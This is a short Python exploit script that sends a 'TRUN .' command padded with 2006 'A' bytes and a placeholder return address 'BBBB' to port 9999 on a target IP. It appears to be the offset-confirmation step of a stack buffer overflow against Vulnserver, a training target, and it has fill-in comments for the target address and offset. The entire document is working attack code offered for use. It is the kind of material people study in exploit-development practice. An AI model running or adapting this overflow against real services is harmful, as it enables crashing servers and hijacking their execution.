#!/usr/bin/python3
import socket, sys
from time import sleep

host = "*.*.*.*"                                         #Enter your Target IP
port = 9999

prefix = "TRUN ."
return_address = "BBBB"
offset = 2006                                            #Here enter your offset that you got.
payload = prefix + offset * "A" + return_address

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending Payloads")
    s.send(bytes(payload, "latin-1"))
    
    
except:
  print("Try Again!!")
  sys.exit(0)

